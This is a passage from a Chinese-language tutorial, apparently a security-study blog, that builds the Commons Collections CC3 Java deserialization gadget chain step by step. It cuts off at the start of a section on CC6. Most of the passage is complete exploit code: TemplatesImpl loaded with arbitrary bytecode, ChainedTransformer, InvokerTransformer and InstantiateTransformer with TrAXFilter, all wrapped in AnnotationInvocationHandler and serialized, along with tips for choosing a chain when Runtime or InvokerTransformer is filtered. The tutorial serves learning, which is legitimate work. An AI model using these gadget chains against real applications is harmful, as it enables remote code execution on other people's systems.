    }
现在就可以弹出计算器了，如果你这里没有弹出来，看一下import的包是不是有问题，`TemplatesImpl`和`TransformerFactoryImpl`的路径一定要是com.xxx，如果是org.xxx是不能用的：
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Path;
    import java.nio.file.Paths;
    public class CC3Test {
        public static void main(String[] args) throws Exception{
            TemplatesImpl templatesimpl = new TemplatesImpl();
            Class tmp = templatesimpl.getClass();
            Field nameField = tmp.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templatesimpl,"y1");
            Field bytecodesField = tmp.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/y1zh3e7/Desktop/Test.class"));
            byte[][] codes = {code};
            bytecodesField.set(templatesimpl,codes);
            Field tfactoryfield = tmp.getDeclaredField("_tfactory");
            tfactoryfield.setAccessible(true);
            tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());
            templatesimpl.newTransformer();
        }
    }
下面我们要想办法执行`templatesimpl.newTransformer`，这里依旧是用CC1中用到的`InvokerTransformer.transform`进行代码的执行：
    TemplatesImpl templatesimpl = new TemplatesImpl();
            Class tmp = templatesimpl.getClass();
            Field nameField = tmp.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templatesimpl,"y1");
            Field bytecodesField = tmp.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/y1zh3e7/Desktop/Test.class"));
            byte[][] codes = {code};
            bytecodesField.set(templatesimpl,codes);
            Field tfactoryfield = tmp.getDeclaredField("_tfactory");
            tfactoryfield.setAccessible(true);
            tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());
            ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(templatesimpl),
                new InvokerTransformer("newTransformer",null,null)
            });
            ctf.transform(1);
剩下的找`Chainedtransformer.transform` 的调用点就和CC1后面一样了，直接粘过来就是：
    package ysoserial.payloads.Test;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Path;
    import java.nio.file.Paths;
    import java.util.HashMap;
    import java.util.Map;
    import static ysoserial.payloads.util.Test.util.Serialize.serialize;
    import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;
    public class CC3Test {
        public static void main(String[] args) throws Exception{
            TemplatesImpl templatesimpl = new TemplatesImpl();
            Class tmp = templatesimpl.getClass();
            Field nameField = tmp.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templatesimpl,"y1");
            Field bytecodesField = tmp.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/y1zh3e7/Desktop/Test.class"));
            byte[][] codes = {code};
            bytecodesField.set(templatesimpl,codes);
            Field tfactoryfield = tmp.getDeclaredField("_tfactory");
            tfactoryfield.setAccessible(true);
            tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());
            ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(templatesimpl),
                new InvokerTransformer("newTransformer",null,null)
            });
            HashMap map = new HashMap();
            map.put("value","v");
            Map transformedMap = TransformedMap.decorate(map,null,ctf);
            Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);
            annotationInvocationHandlerconstructor.setAccessible(true);
            Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);
            serialize(o);
            unserialize("ser.bin");
        }
    }
相较于CC1来说一个是通过调用Runtime来进行命令执行，一个是通过动态类加载进行代码执行，如果过滤了Runtime我们就可以尝试用这条CC3
接下来我们在来说ysoserial上用的另一条调用链：
我们回到`newTransformer`，刚才说的是用CC1后半段直接调用，我们接着向下找调用`newTransformer`
的地方，最终锁定在了`com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java`
这个类上，这个类没有继承serialize接口，也就是说我们没办法通过反射来修改实例中属性的值，但是我们想到对属性值进行初始化的操作一般在构造函数中，我们来看一下它的构造函数：
    public TrAXFilter(Templates templates)  throws
            TransformerConfigurationException
        {
            _templates = templates;
            _transformer = (TransformerImpl) templates.newTransformer();
            _transformerHandler = new TransformerHandlerImpl(_transformer);
            _useServicesMechanism = _transformer.useServicesMechnism();
        }
我们可以通过这个构造函数来控制这个templates的值，所以下一步就是要找可以调用这个构造函数的地方，ysoserial中给出了`InstantiateTransformer`
这个类，通过它的构造函数和transform方法可以调用一个对象的指定参数的构造函数：
    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
    public Object transform(Object input) {
            try {
                if (!(input instanceof Class)) {
                    throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
                } else {
                    Constructor con = ((Class)input).getConstructor(this.iParamTypes);
                    return con.newInstance(this.iArgs);
                }
也就是说下面两行代码就可以执行newTransformer了：
    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});
    instantiateTransformer.transform(TrAXFilter.class);
最终还是用ChainedTransformer包裹起来执行：
    TemplatesImpl templatesimpl = new TemplatesImpl();
            Class tmp = templatesimpl.getClass();
            Field nameField = tmp.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templatesimpl,"y1");
            Field bytecodesField = tmp.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            byte[] code = Files.readAllBytes(Paths.get("/Users/y1zh3e7/Desktop/Test.class"));
            byte[][] codes = {code};
            bytecodesField.set(templatesimpl,codes);
            Field tfactoryfield = tmp.getDeclaredField("_tfactory");
            tfactoryfield.setAccessible(true);
            tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());
            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});
            ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
            });
            HashMap map = new HashMap();
            map.put("value","v");
            Map transformedMap = TransformedMap.decorate(map,null,ctf);
            Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);
            annotationInvocationHandlerconstructor.setAccessible(true);
            Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);
            serialize(o);
            unserialize("ser.bin");
完整的CC6调用链，当InvokerTransformer被ban时就可以用这条链：